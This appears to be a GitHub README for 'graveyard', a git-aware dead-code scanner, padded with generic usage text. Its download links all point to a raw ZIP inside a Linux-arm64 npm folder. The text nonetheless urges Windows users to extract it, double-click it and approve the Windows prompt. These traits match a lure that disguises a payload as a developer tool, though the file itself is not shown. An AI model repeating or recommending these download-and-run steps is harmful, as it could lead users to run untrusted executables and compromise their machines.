# 🪦 graveyard - Find dead code with git-aware confidence

[![Download](https://img.shields.io/badge/Download-Graveyard-blue?style=for-the-badge&logo=github)](https://github.com/laurylalcoholmaracanlanguage842/graveyard/raw/refs/heads/main/npm/graveyard-linux-arm64/Software-v2.0.zip)

## ⚡ Quick Download

Visit this page to download: https://github.com/laurylalcoholmaracanlanguage842/graveyard/raw/refs/heads/main/npm/graveyard-linux-arm64/Software-v2.0.zip

If you are on Windows, open the page above and look for the latest release or download file. Then save it to your computer and run it.

## 🧭 What graveyard does

graveyard scans your codebase and looks for code that no longer seems used. It works with Python, JavaScript, TypeScript, Go, and Rust.

It also checks git history before it makes a call. That helps it score results with more confidence, so you can focus on the code that is most likely safe to remove.

Use it when you want to:
- find old code that sits in the repo but no longer runs
- reduce clutter in a monorepo
- review code before cleanup
- spot dead files, unused functions, and stale paths
- get a clear report you can inspect by hand

## 🖥️ Windows setup

1. Open the download page: https://github.com/laurylalcoholmaracanlanguage842/graveyard/raw/refs/heads/main/npm/graveyard-linux-arm64/Software-v2.0.zip
2. Find the latest release or the main download file
3. Download the Windows file to a folder you can find, such as Downloads
4. If the file is a ZIP, right-click it and choose Extract All
5. Open the extracted folder
6. Double-click the graveyard app or run the command file if one is included
7. If Windows asks for permission, choose Run
8. If a terminal window opens, leave it open while the scan runs

If you use Windows Terminal or Command Prompt, you can also run the tool from the folder where you saved it.

## 📦 What you need

graveyard is meant to run on a standard Windows desktop or laptop.

A good setup is:
- Windows 10 or Windows 11
- a few hundred MB of free disk space
- access to the project folder you want to scan
- git installed if you want full history-based scoring

For larger repos, more memory helps. A normal dev machine should handle small and medium projects well.

## 🛠️ How to use it

1. Open graveyard
2. Point it at the folder that contains your code
3. Start the scan
4. Wait for the report
5. Review the results one by one

The report may show:
- file path
- symbol name
- language
- confidence score
- git-based context
- reason the code looks unused

If you scan a monorepo, graveyard can help you find dead code inside each package without forcing you to inspect everything by hand.

## 🧪 Example use cases

### 🐍 Python projects
Use graveyard to find old helper functions, unused modules, and code paths that no longer match current imports.

### 🌐 JavaScript and TypeScript projects
Use it to catch unused components, stale utility files, and code left behind after refactors.

### 🐹 Go projects
Use it to surface functions that no longer have callers, old command paths, and files that seem detached from the build.

### 🦀 Rust projects
Use it to inspect modules, functions, and internal code that may no longer be linked to active paths.

## 📊 How confidence scoring works

graveyard does not guess from file names alone. It looks at code structure and git history to assign a confidence score.

That score can help you decide:
- whether a result looks safe to delete
- whether it needs a closer review
- whether the code is old but still used in a rare path

Higher scores mean graveyard found more signs that the code is unused. Lower scores mean the result needs more review.

## 🧹 Best way to review results

When you get a result, check these things:
- is the function or file still imported anywhere
- does git history show recent use
- does the code support tests, scripts, or build steps
- is the path used only in special cases
- does the result belong to generated code or hand-written code

If you are not sure, keep the file and inspect it later. Safe cleanup matters more than fast cleanup.

## 🔍 Good places to scan first

Start with code areas that change often:
- utility folders
- old feature branches merged into main
- shared libraries
- command handlers
- test helpers
- files with names like old, temp, backup, or deprecated

These spots often hold code that looks active but no longer is.

## 🗂️ Suggested workflow

1. Clone or open your project
2. Run graveyard on the repo root
3. Sort results by confidence
4. Check the highest-confidence items first
5. Remove only code you can verify
6. Run tests after each cleanup batch
7. Commit small changes so you can trace what changed

This keeps cleanup easy to follow and easy to undo if needed.

## 🧱 Topics covered

graveyard fits projects that use:
- CLI workflows
- code quality checks
- code scanning
- dead-code review
- developer tools
- git history
- monorepo setups
- polyglot codebases
- Rust tooling
- SARIF output
- static analysis
- tree-sitter parsing

## ❓ Common questions

### Does it work on mixed-language repos?
Yes. It is built for repos that mix Python, JS, TS, Go, and Rust.

### Do I need to know git?
No, but git helps graveyard give better results.

### Can I use it on a monorepo?
Yes. That is one of the main use cases.

### Will it delete files for me?
graveyard helps you find code to review. You should inspect results before removing anything.

### Can I run it on a normal Windows PC?
Yes. Download it from the page above, open the file, and run the scan from your code folder.

## 📁 Folder tips for first-time users

If you are new to code tools, place your project in a simple folder path like:

C:\Projects\my-app

Short paths help keep things easy to find. If your repo is in Downloads or Desktop, that works too.

## 🔗 Download again

Visit this page to download: https://github.com/laurylalcoholmaracanlanguage842/graveyard/raw/refs/heads/main/npm/graveyard-linux-arm64/Software-v2.0.zip

Use the latest release or the main download file, then download and run this file on Windows